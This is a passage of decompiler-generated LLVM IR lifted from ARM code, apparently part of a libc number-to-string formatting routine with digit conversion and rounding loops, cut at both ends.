  store i1 %v2_18bc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18bc0, label %dec_label_pc_18c14, label %.thread9.dec_label_pc_18bc8_crit_edge

.thread9.dec_label_pc_18bc8_crit_edge:            ; preds = %.thread9
  %v3_18bc8.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_18bc8

dec_label_pc_18bc8:                               ; preds = %bb207, %.thread9.dec_label_pc_18bc8_crit_edge
  %v3_18bc8 = phi i32 [ %v3_18bc8.pre, %.thread9.dec_label_pc_18bc8_crit_edge ], [ %arg4, %bb207 ]
  %v1_18b0c.v0_18af85 = phi i32 [ 0, %.thread9.dec_label_pc_18bc8_crit_edge ], [ 8, %bb207 ]
  store i32 %v3_18bc8, i32* %ip.global-to-local, align 4
  %v2_18bd0 = add i32 %v3_18bc8, 16
  %v3_18bd0 = inttoptr i32 %v2_18bd0 to i32*
  store i32 32, i32* %v3_18bd0, align 4
  %v0_18bd8 = load i32, i32* %sb.global-to-local, align 4
  %v7_18bd8 = icmp eq i32 %v0_18bd8, 96
  store i1 %v7_18bd8, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-164, align 4
  %tmp274 = icmp ult i32 %v0_18bd8, 97
  br i1 %tmp274, label %bb210, label %.thread124

bb210:                                            ; preds = %dec_label_pc_18bc8
  %v5_18bec = or i32 %v1_18b0c.v0_18af85, 4
  store i32 %v5_18bec, i32* %r3.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_18bc8, %bb210
  %v4_18bf0 = phi i32 [ %v5_18bec, %bb210 ], [ 3, %dec_label_pc_18bc8 ]
  %v4_18bf0.v1_18b0c.v0_18af8 = select i1 %tmp274, i32 %v4_18bf0, i32 %v1_18b0c.v0_18af85
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -1424), i32* %r3.global-to-local, align 4
  %v2_18c04 = add i32 %v4_18bf0.v1_18b0c.v0_18af8, add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -1424)
  store i32 %v2_18c04, i32* %r2.global-to-local, align 4
  %v2_18c08 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_18c08, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_19130

dec_label_pc_18c14:                               ; preds = %.thread9
  %v0_18c14 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_18c14, i32* %r1.global-to-local, align 4
  store i32 1100470148, i32* %r3.global-to-local, align 4
  %v0_18c1c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_18c1c, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  %v6_18c24 = call i32 @__aeabi_dcmplt(i32 %v0_18c1c, i32 %v0_18c14, i32 0, i32 1100470148)
  store i32 %v6_18c24, i32* %r0.global-to-local, align 4
  %v2_18c28 = icmp eq i32 %v6_18c24, 0
  store i1 %v2_18c28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c28, label %bb212, label %bb211

bb211:                                            ; preds = %dec_label_pc_18c14
  store i32 1, i32* %r0.global-to-local, align 4
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_18c14, %bb211
  %v0_18c30 = phi i32 [ 0, %dec_label_pc_18c14 ], [ 1, %bb211 ]
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -1400), i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -1400), i32* %stack_var_-208, align 4
  store i32 9, i32* %sl.global-to-local, align 4
  store i32 256, i32* %r4.global-to-local, align 4
  %v2_18c64 = icmp eq i32 %v0_18c30, 0
  br label %dec_label_pc_18c54

dec_label_pc_18c54:                               ; preds = %dec_label_pc_18cec.dec_label_pc_18c54_crit_edge, %bb212
  %v2_18c5c = phi i32 [ add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -1400), %bb212 ], [ %v2_18c5c.pre, %dec_label_pc_18cec.dec_label_pc_18c54_crit_edge ]
  %v0_18c58 = phi i32 [ 9, %bb212 ], [ %v0_18cec, %dec_label_pc_18cec.dec_label_pc_18c54_crit_edge ]
  %v2_18c9c = phi i32 [ 8, %bb212 ], [ %stack_var_-192.3, %dec_label_pc_18cec.dec_label_pc_18c54_crit_edge ]
  store i32 %v0_18c30, i32* %r2.global-to-local, align 4
  %v1_18c58 = add i32 %v0_18c58, -1
  store i32 %v1_18c58, i32* %sl.global-to-local, align 4
  store i32 %v2_18c5c, i32* @lr, align 4
  %v3_18c60 = mul i32 %v1_18c58, 8
  store i32 %v3_18c60, i32* %r3.global-to-local, align 4
  store i1 %v2_18c64, i1* %cpsr_z.global-to-local, align 1
  %v0_18c68 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_18c68, i32* %r0.global-to-local, align 4
  %v0_18c6c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_18c6c, i32* %r1.global-to-local, align 4
  %v2_18c70 = add i32 %v3_18c60, %v2_18c5c
  store i32 %v2_18c70, i32* %ip.global-to-local, align 4
  %v1_18cac = inttoptr i32 %v2_18c70 to i32*
  %v2_18cac = load i32, i32* %v1_18cac, align 4
  %v3_18cac = sext i32 %v2_18cac to i64
  %v1_18cb0 = sext i32 %v0_18c68 to i64
  %v2_18cb0 = bitcast i64 %v1_18cb0 to double
  br i1 %v2_18c64, label %dec_label_pc_18cac, label %dec_label_pc_18c78

dec_label_pc_18c78:                               ; preds = %dec_label_pc_18c54
  %v8_18c7c = bitcast i64 %v3_18cac to double
  %v9_18c7c = fmul double %v2_18cb0, %v8_18c7c
  %v10_18c7c = fptrunc double %v9_18c7c to float
  %v11_18c7c = bitcast float %v10_18c7c to i32
  store i32 %v11_18c7c, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  store i32 %v11_18c7c, i32* %r7.global-to-local, align 4
  store i32 %v0_18c6c, i32* %r8.global-to-local, align 4
  %v4_18c90 = call i32 @__aeabi_dcmplt(i32 %v11_18c7c, i32 %v0_18c6c, i32 0, i32 1104006501)
  store i32 %v4_18c90, i32* %r0.global-to-local, align 4
  %v2_18c94 = icmp eq i32 %v4_18c90, 0
  store i1 %v2_18c94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c94, label %dec_label_pc_18cec, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_18c78
  %v1_18c9c = load i32, i32* %r4.global-to-local, align 4
  %v3_18c9c = sub i32 %v2_18c9c, %v1_18c9c
  store i32 %v3_18c9c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18ce4

dec_label_pc_18cac:                               ; preds = %dec_label_pc_18c54
  store i32 %v0_18c6c, i32* @r1, align 4
  %v8_18cb8 = bitcast i64 %v3_18cac to double
  %v9_18cb8 = fdiv double %v2_18cb0, %v8_18cb8
  %v10_18cb8 = fptrunc double %v9_18cb8 to float
  %v11_18cb8 = bitcast float %v10_18cb8 to i32
  store i32 %v11_18cb8, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1100470148, i32* @r3, align 4
  store i32 %v11_18cb8, i32* %r7.global-to-local, align 4
  store i32 %v0_18c6c, i32* %r8.global-to-local, align 4
  %v4_18ccc = call i32 @__aeabi_dcmpge(i32 %v11_18cb8, i32 %v0_18c6c, i32 0, i32 1100470148)
  store i32 %v4_18ccc, i32* %r0.global-to-local, align 4
  %v2_18cd0 = icmp eq i32 %v4_18ccc, 0
  store i1 %v2_18cd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18cd0, label %dec_label_pc_18cec, label %dec_label_pc_18cd8

dec_label_pc_18cd8:                               ; preds = %dec_label_pc_18cac
  %v1_18cdc = load i32, i32* %r4.global-to-local, align 4
  %v2_18cdc = add i32 %v1_18cdc, %v2_18c9c
  store i32 %v2_18cdc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18ce4

dec_label_pc_18ce4:                               ; preds = %.thread10, %dec_label_pc_18cd8
  %stack_var_-192.2 = phi i32 [ %v2_18cdc, %dec_label_pc_18cd8 ], [ %v3_18c9c, %.thread10 ]
  %v0_18ce4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_18ce4, i32* %r5.global-to-local, align 4
  %v0_18ce8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_18ce8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18cec

dec_label_pc_18cec:                               ; preds = %dec_label_pc_18c78, %dec_label_pc_18cac, %dec_label_pc_18ce4
  %stack_var_-192.3 = phi i32 [ %v2_18c9c, %dec_label_pc_18cac ], [ %stack_var_-192.2, %dec_label_pc_18ce4 ], [ %v2_18c9c, %dec_label_pc_18c78 ]
  %v0_18cec = load i32, i32* %sl.global-to-local, align 4
  %v2_18cec = icmp eq i32 %v0_18cec, 0
  store i1 %v2_18cec, i1* %cpsr_z.global-to-local, align 1
  %v0_18cf0 = load i32, i32* %r4.global-to-local, align 4
  %v3_18cf0 = sdiv i32 %v0_18cf0, 2
  store i32 %v3_18cf0, i32* %r4.global-to-local, align 4
  br i1 %v2_18cec, label %dec_label_pc_18cf8, label %dec_label_pc_18cec.dec_label_pc_18c54_crit_edge

dec_label_pc_18cec.dec_label_pc_18c54_crit_edge:  ; preds = %dec_label_pc_18cec
  %v2_18c5c.pre = load i32, i32* %stack_var_-208, align 4
  br label %dec_label_pc_18c54

dec_label_pc_18cf8:                               ; preds = %dec_label_pc_18cec
  %v0_18cf8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_18cf8, i32* @r0, align 4
  %v0_18cfc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_18cfc, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* @r3, align 4
  %v6_18d08 = call i32 @__aeabi_dcmpge(i32 %v0_18cf8, i32 %v0_18cfc, i32 0, i32 1104006501)
  store i32 %v6_18d08, i32* %r0.global-to-local, align 4
  %v2_18d0c = icmp eq i32 %v6_18d08, 0
  store i1 %v2_18d0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18d0c, label %dec_label_pc_18d3c, label %dec_label_pc_18d14

dec_label_pc_18d14:                               ; preds = %dec_label_pc_18cf8
  %v0_18d14 = load i32, i32* %r5.global-to-local, align 4
  %v1_18d14 = sext i32 %v0_18d14 to i64
  %v2_18d14 = bitcast i64 %v1_18d14 to double
  %v0_18d18 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_18d18, i32* %r1.global-to-local, align 4
  store i32 1076101120, i32* %r3.global-to-local, align 4
  %v9_18d24 = fdiv double %v2_18d14, 0.000000e+00
  %v10_18d24 = fptrunc double %v9_18d24 to float
  %v11_18d24 = bitcast float %v10_18d24 to i32
  store i32 %v11_18d24, i32* %r0.global-to-local, align 4
  store i32 %v11_18d24, i32* %r5.global-to-local, align 4
  %v1_18d34 = add i32 %stack_var_-192.3, 1
  store i32 %v1_18d34, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18d3c

dec_label_pc_18d3c:                               ; preds = %dec_label_pc_18d14, %bb208, %dec_label_pc_18cf8, %dec_label_pc_18b5c
  %stack_var_-192.4 = phi i32 [ %stack_var_-192.3, %dec_label_pc_18cf8 ], [ -1, %dec_label_pc_18b5c ], [ -1, %bb208 ], [ %v1_18d34, %dec_label_pc_18d14 ]
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_18d40 = ptrtoint i32* %stack_var_-81 to i32
  store i32 %v2_18d40, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_18d44

dec_label_pc_18d44:                               ; preds = %dec_label_pc_18dbc, %dec_label_pc_18d3c
  %v0_18d44 = load i32, i32* %r6.global-to-local, align 4
  %v0_18d48 = load i32, i32* %r5.global-to-local, align 4
  %v1_18d4c = sext i32 %v0_18d48 to i64
  %v2_18d4c = bitcast i64 %v1_18d4c to double
  %v3_18d4c = fptoui double %v2_18d4c to i32
  store i32 %v3_18d4c, i32* %r8.global-to-local, align 4
  store i32 %v3_18d4c, i32* %r2.global-to-local, align 4
  store i32 %v0_18d44, i32* %r3.global-to-local, align 4
  store i32 %v0_18d48, i32* @r0, align 4
  store i32 %v0_18d44, i32* %r1.global-to-local, align 4
  %v6_18d68 = call i32 @__aeabi_dsub(i32 %v0_18d48, i32 %v0_18d44, i32 %v3_18d4c, i32 %v0_18d44)
  %v7_18d68 = sext i32 %v6_18d68 to i64
  %v8_18d68 = bitcast i64 %v7_18d68 to double
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  %v9_18d74 = fmul double %v8_18d68, 0.000000e+00
  %v10_18d74 = fptrunc double %v9_18d74 to float
  %v11_18d74 = bitcast float %v10_18d74 to i32
  store i32 %v11_18d74, i32* %r0.global-to-local, align 4
  %v0_18d78 = load i32, i32* %sl.global-to-local, align 4
  %v1_18d78 = add i32 %v0_18d78, 9
  store i32 %v1_18d78, i32* %sl.global-to-local, align 4
  store i32 %v11_18d74, i32* %r5.global-to-local, align 4
  store i32 %v0_18d44, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_18d88.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_18d88

dec_label_pc_18d88:                               ; preds = %dec_label_pc_18d88.dec_label_pc_18d88_crit_edge, %dec_label_pc_18d44
  %v1_18d9c = phi i32 [ %v1_18d9c.pre, %dec_label_pc_18d88.dec_label_pc_18d88_crit_edge ], [ %v1_18d78, %dec_label_pc_18d44 ]
  %v0_18d94 = phi i32 [ %v0_18db0, %dec_label_pc_18d88.dec_label_pc_18d88_crit_edge ], [ 0, %dec_label_pc_18d44 ]
  %v0_18da0 = phi i32 [ %v2_18dac, %dec_label_pc_18d88.dec_label_pc_18d88_crit_edge ], [ %v0_18d88.pre, %dec_label_pc_18d44 ]
  %v3_18d90 = urem i32 %v0_18da0, 10
  %v1_18d94 = add i32 %v0_18d94, 1
  store i32 %v1_18d94, i32* %r7.global-to-local, align 4
  %v1_18d98 = or i32 %v3_18d90, 48
  store i32 %v1_18d98, i32* %r2.global-to-local, align 4
  %v2_18d9c = sub i32 %v1_18d9c, %v1_18d94
  store i32 %v2_18d9c, i32* %r3.global-to-local, align 4
  store i32 %v0_18da0, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_18da8 = trunc i32 %v1_18d98 to i8
  %v3_18da8 = inttoptr i32 %v2_18d9c to i8*
  store i8 %v1_18da8, i8* %v3_18da8, align 1
  %v0_18dac = load i32, i32* %r0.global-to-local, align 4
  %v1_18dac = load i32, i32* %r1.global-to-local, align 4
  %v2_18dac = udiv i32 %v0_18dac, %v1_18dac
  store i32 %v2_18dac, i32* %r0.global-to-local, align 4
  %v0_18db0 = load i32, i32* %r7.global-to-local, align 4
  %v7_18db0 = icmp eq i32 %v0_18db0, 8
  store i1 %v7_18db0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_18dac, i32* %r8.global-to-local, align 4
  %v7_18db8 = icmp slt i32 %v0_18db0, 9
  br i1 %v7_18db8, label %dec_label_pc_18d88.dec_label_pc_18d88_crit_edge, label %dec_label_pc_18dbc

dec_label_pc_18d88.dec_label_pc_18d88_crit_edge:  ; preds = %dec_label_pc_18d88
  %v1_18d9c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_18d88

dec_label_pc_18dbc:                               ; preds = %dec_label_pc_18d88
  %v0_18dbc = load i32, i32* %r4.global-to-local, align 4
  %v1_18dbc = add i32 %v0_18dbc, 1
  store i32 %v1_18dbc, i32* %r4.global-to-local, align 4
  %v7_18dc0 = icmp eq i32 %v0_18dbc, 0
  store i1 %v7_18dc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18dc0, label %dec_label_pc_18d44, label %dec_label_pc_18dc8

dec_label_pc_18dc8:                               ; preds = %dec_label_pc_18dbc
  %v0_18dc8 = load i32, i32* %sb.global-to-local, align 4
  %v7_18dc8 = icmp eq i32 %v0_18dc8, 96
  store i1 %v7_18dc8, i1* %cpsr_z.global-to-local, align 1
  %tmp275 = icmp ult i32 %v0_18dc8, 97
  br i1 %tmp275, label %bb213, label %thread-pre-split

bb213:                                            ; preds = %dec_label_pc_18dc8
  %v5_18dd8 = add i32 %v0_18dc8, 32
  store i32 %v5_18dd8, i32* %r3.global-to-local, align 4
  %v5_18ddc = urem i32 %v5_18dd8, 256
  store i32 %v5_18ddc, i32* %sb.global-to-local, align 4
  br label %bb214

thread-pre-split:                                 ; preds = %dec_label_pc_18dc8
  %v4_18dd4.pre129134 = load i32, i32* %r3.global-to-local, align 4
  %phitmp = urem i32 %v4_18dd4.pre129134, 256
  br label %bb214

bb214:                                            ; preds = %thread-pre-split, %bb213
  %v4_18dd4126130 = phi i32 [ %phitmp, %thread-pre-split ], [ 69, %bb213 ]
  %v0_18dfc = phi i32 [ %v0_18dc8, %thread-pre-split ], [ %v5_18ddc, %bb213 ]
  %v7_18de0 = icmp eq i32 %v0_18dfc, 103
  %. = zext i1 %v7_18de0 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_18dec = load i32, i32* %fp.global-to-local, align 4
  %v2_18dec = icmp eq i32 %v0_18dec, 0
  store i1 %v2_18dec, i1* %cpsr_z.global-to-local, align 1
  %tmp217 = icmp slt i32 %v0_18dec, 1
  br i1 %tmp217, label %.thread16, label %bb218

.thread16:                                        ; preds = %bb214
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb220

bb218:                                            ; preds = %bb214
  %v2_18df4 = icmp eq i1 %v7_18de0, false
  store i1 %v2_18df4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18df4, label %bb220, label %bb219

bb219:                                            ; preds = %bb218
  %v2_18df8 = add i32 %v0_18dec, -1
  store i32 %v2_18df8, i32* %fp.global-to-local, align 4
  br label %bb220

bb220:                                            ; preds = %.thread16, %bb218, %bb219
  %v0_18e0c = phi i32 [ %v0_18dec, %.thread16 ], [ %v0_18dec, %bb218 ], [ %v2_18df8, %bb219 ]
  %v7_18dfc = icmp eq i32 %v0_18dfc, 102
  store i1 %v7_18dfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18dfc, label %dec_label_pc_18e08, label %bb221

bb221:                                            ; preds = %bb220
  store i32 %v0_18e0c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_18e30

dec_label_pc_18e08:                               ; preds = %bb220
  store i32 %stack_var_-192.4, i32* %r3.global-to-local, align 4
  %v2_18e0c = add i32 %v0_18e0c, %stack_var_-192.4
  store i32 %v2_18e0c, i32* %ip.global-to-local, align 4
  %v8_18e10 = icmp eq i32 %v2_18e0c, -1
  store i1 %v8_18e10, i1* %cpsr_z.global-to-local, align 1
  %v6_18e14 = icmp slt i32 %v2_18e0c, -1
  br i1 %v6_18e14, label %dec_label_pc_18e18, label %dec_label_pc_18e30

dec_label_pc_18e18:                               ; preds = %dec_label_pc_18e08
  %v2_18e18 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_18e18, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_18e24 = bitcast i32* %stack_var_-83 to i8*
  %v3_18e24 = call i32 @__GI_memset(i8* %v2_18e24, i32 48)
  store i32 %v3_18e24, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_18e30

dec_label_pc_18e30:                               ; preds = %bb221, %dec_label_pc_18e08, %dec_label_pc_18e18
  %v1_18e7492 = phi i32 [ %v3_18e24, %dec_label_pc_18e18 ], [ %v2_18dac, %dec_label_pc_18e08 ], [ %v2_18dac, %bb221 ]
  %v1_18e58 = phi i32 [ -1, %dec_label_pc_18e18 ], [ %v2_18e0c, %dec_label_pc_18e08 ], [ %v0_18e0c, %bb221 ]
  %stack_var_-192.5 = phi i32 [ -1, %dec_label_pc_18e18 ], [ %stack_var_-192.4, %dec_label_pc_18e08 ], [ %stack_var_-192.4, %bb221 ]
  %v1_18e34 = add i32 %v1_18e58, -16
  %v3_18e34 = sub i32 15, %v1_18e58
  %v4_18e34 = and i32 %v3_18e34, %v1_18e58
  %v5_18e34 = icmp slt i32 %v4_18e34, 0
  %v6_18e34 = icmp slt i32 %v1_18e34, 0
  %v7_18e34 = icmp eq i32 %v1_18e58, 16
  store i1 %v7_18e34, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-82, align 4
  %v2_18e40 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_18e40, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-83, align 4
  %v3_18e48 = xor i1 %v6_18e34, %v5_18e34
  %v4_18e48 = or i1 %v7_18e34, %v3_18e48
  br i1 %v4_18e48, label %dec_label_pc_18e54, label %.thread140

.thread140:                                       ; preds = %dec_label_pc_18e30
  %v7_18e48137141 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v7_18e48137141, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_18e54:                               ; preds = %dec_label_pc_18e30
  %v2_18e54 = ptrtoint i32* %stack_var_-82 to i32
  %v2_18e58 = add i32 %v1_18e58, %v2_18e54
  store i32 %v2_18e58, i32* %r3.global-to-local, align 4
  %v1_18e5c = add i32 %v2_18e58, 2
  %v2_18e5c = inttoptr i32 %v1_18e5c to i8*
  %v3_18e5c = load i8, i8* %v2_18e5c, align 1
  %v4_18e5c = zext i8 %v3_18e5c to i32
  store i32 %v4_18e5c, i32* %r2.global-to-local, align 4
  store i32 %v1_18e5c, i32* %r1.global-to-local, align 4
  %v2_18e64 = icmp ugt i8 %v3_18e5c, 51
  %v7_18e64 = icmp eq i8 %v3_18e5c, 52
  store i1 %v7_18e64, i1* %cpsr_z.global-to-local, align 1
  %v2_18e68 = xor i1 %v2_18e64, true
  %v3_18e68 = or i1 %v7_18e64, %v2_18e68
  br i1 %v3_18e68, label %bb222, label %bb223

bb222:                                            ; preds = %dec_label_pc_18e54
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb223

bb223:                                            ; preds = %dec_label_pc_18e54, %bb222
  %v1_18e7490 = phi i32 [ %v1_18e7492, %dec_label_pc_18e54 ], [ 0, %bb222 ]
  %v2_18e6c = xor i1 %v7_18e64, true
  %v3_18e6c = and i1 %v2_18e64, %v2_18e6c
  br i1 %v3_18e6c, label %bb224, label %.preheader

bb224:                                            ; preds = %bb223
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb223, %bb224, %.thread140, %._crit_edge87
  %v0_18e70 = phi i32 [ %v0_18e70.pre, %._crit_edge87 ], [ %v7_18e48137141, %.thread140 ], [ %v1_18e5c, %bb223 ], [ %v1_18e5c, %bb224 ]
  %v1_18e74 = phi i32 [ %v1_18e74.pre, %._crit_edge87 ], [ 0, %.thread140 ], [ %v1_18e7490, %bb223 ], [ 1, %bb224 ]
  %v1_18e70 = add i32 %v0_18e70, -1
  %v2_18e70 = inttoptr i32 %v1_18e70 to i8*
  %v3_18e70 = load i8, i8* %v2_18e70, align 1
  %v4_18e70 = zext i8 %v3_18e70 to i32
  store i32 %v1_18e70, i32* %r1.global-to-local, align 4
  %v2_18e74 = add i32 %v4_18e70, %v1_18e74
  %v1_18e78 = urem i32 %v2_18e74, 256
  store i32 %v1_18e78, i32* %r3.global-to-local, align 4
  %v2_18e7c = icmp ugt i32 %v1_18e78, 56
  %v7_18e7c = icmp eq i32 %v1_18e78, 57
  store i1 %v7_18e7c, i1* %cpsr_z.global-to-local, align 1
  %v2_18e80 = xor i1 %v2_18e7c, true
  %v3_18e80 = or i1 %v7_18e7c, %v2_18e80
  br i1 %v3_18e80, label %bb225, label %bb226

bb225:                                            ; preds = %.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %.preheader, %bb225
  %v2_18e84 = xor i1 %v7_18e7c, true
  %v3_18e84 = and i1 %v2_18e7c, %v2_18e84
  br i1 %v3_18e84, label %bb227, label %bb226.bb228_crit_edge

bb226.bb228_crit_edge:                            ; preds = %bb226
  %v1_18e8c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb228

bb227:                                            ; preds = %bb226
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb228

bb228:                                            ; preds = %bb226.bb228_crit_edge, %bb227
  %v1_18e8c = phi i32 [ %v1_18e8c.pre, %bb226.bb228_crit_edge ], [ 1, %bb227 ]
  %v7_18e88 = icmp eq i32 %v1_18e78, 48
  store i1 %v7_18e88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18e88, label %bb229, label %._crit_edge93

bb229:                                            ; preds = %bb228
  %v2_18e8c = or i32 %v1_18e8c, 1
  store i32 %v2_18e8c, i32* %r2.global-to-local, align 4
  br label %._crit_edge93

._crit_edge93:                                    ; preds = %bb228, %bb229
  %v0_18e90 = phi i32 [ 1, %bb229 ], [ %v1_18e8c, %bb228 ]
  %v2_18e90 = icmp eq i32 %v0_18e90, 0
  store i1 %v2_18e90, i1* %cpsr_z.global-to-local, align 1
  %v1_18e94 = trunc i32 %v2_18e74 to i8
  store i8 %v1_18e94, i8* %v2_18e70, align 1
  %v0_18e98 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18e98, label %dec_label_pc_18e9c, label %._crit_edge87

._crit_edge87:                                    ; preds = %._crit_edge93
  %v1_18e74.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_18e70.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_18e9c:                               ; preds = %._crit_edge93
  store i32 %v2_18e40, i32* %r2.global-to-local, align 4
  %v2_18ea0 = ptrtoint i32* %stack_var_-82 to i32
  store i32 %v2_18ea0, i32* %r3.global-to-local, align 4
  %v0_18ea4 = load i32, i32* %r1.global-to-local, align 4
  %v3_18ea4 = icmp uge i32 %v0_18ea4, %v2_18ea0
  %v9_18ea4 = icmp eq i32 %v0_18ea4, %v2_18ea0
  store i1 %v9_18ea4, i1* %cpsr_z.global-to-local, align 1
  %v2_18ea8 = xor i1 %v3_18ea4, true
  %v3_18ea8 = or i1 %v9_18ea4, %v2_18ea8
  br i1 %v3_18ea8, label %bb230, label %.thread145

bb230:                                            ; preds = %dec_label_pc_18e9c
  store i32 %stack_var_-192.5, i32* @lr, align 4
  store i32 %v2_18ea0, i32* %r2.global-to-local, align 4
  store i32 %v2_18ea0, i32* %r1.global-to-local, align 4
  br label %.thread145

.thread145:                                       ; preds = %dec_label_pc_18e9c, %bb230
  %v2_18ec8 = phi i32 [ %v2_18ea0, %bb230 ], [ %v0_18ea4, %dec_label_pc_18e9c ]
  %v4_18ebc144 = phi i32 [ %v2_18ea0, %bb230 ], [ %v2_18e40, %dec_label_pc_18e9c ]
  %v2_18eb4 = xor i1 %v9_18ea4, true
  %v3_18eb4 = and i1 %v3_18ea4, %v2_18eb4
  br i1 %v3_18eb4, label %bb231, label %bb232

bb231:                                            ; preds = %.thread145
  store i32 %stack_var_-192.5, i32* %r0.global-to-local, align 4
  br label %bb232

bb232:                                            ; preds = %.thread145, %bb231
  br i1 %v3_18ea8, label %bb233, label %bb234

bb233:                                            ; preds = %bb232
  %v4_18eb8 = load i32, i32* @lr, align 4
  %v5_18eb8 = add i32 %v4_18eb8, 1
  store i32 %v5_18eb8, i32* %r0.global-to-local, align 4
  br label %bb234

bb234:                                            ; preds = %bb232, %bb233
  br i1 %v3_18eb4, label %bb235, label %bb236

bb235:                                            ; preds = %bb234
  %v5_18ebc = add i32 %v4_18ebc144, 2
  store i32 %v5_18ebc, i32* %r2.global-to-local, align 4
  br label %bb236

bb236:                                            ; preds = %bb234, %bb235
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18ec4 = load i32, i32* %sb.global-to-local, align 4
  %v7_18ec4 = icmp eq i32 %v0_18ec4, 103
  store i1 %v7_18ec4, i1* %cpsr_z.global-to-local, align 1
  %v3_18ec8 = add i32 %v2_18ec8, 1
  %v4_18ec8 = inttoptr i32 %v3_18ec8 to i8*
  store i8 0, i8* %v4_18ec8, align 1
  %v0_18ecc = load i32, i32* %r1.global-to-local, align 4
  %v1_18ecc = add i32 %v0_18ecc, 1
  store i32 %v1_18ecc, i32* %lr.global-to-local, align 4
  %v0_18ed0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18ed0, label %dec_label_pc_18ed4, label %dec_label_pc_18efc

dec_label_pc_18ed4:                               ; preds = %bb236
  %v0_18ed4 = load i32, i32* %r0.global-to-local, align 4
  %v1_18ed4 = load i32, i32* %ip.global-to-local, align 4
  %v2_18ed4 = sub i32 %v0_18ed4, %v1_18ed4
  %v4_18ed4 = xor i32 %v1_18ed4, %v0_18ed4
  %v5_18ed4 = xor i32 %v2_18ed4, %v0_18ed4
  %v6_18ed4 = and i32 %v5_18ed4, %v4_18ed4
  %v7_18ed4 = icmp slt i32 %v6_18ed4, 0
  %v8_18ed4 = icmp slt i32 %v2_18ed4, 0
  %v9_18ed4 = icmp eq i32 %v0_18ed4, %v1_18ed4
  %v3_18ed8 = xor i1 %v8_18ed4, %v7_18ed4
  %v4_18ed8 = or i1 %v9_18ed4, %v3_18ed8
  %.258 = zext i1 %v4_18ed8 to i32
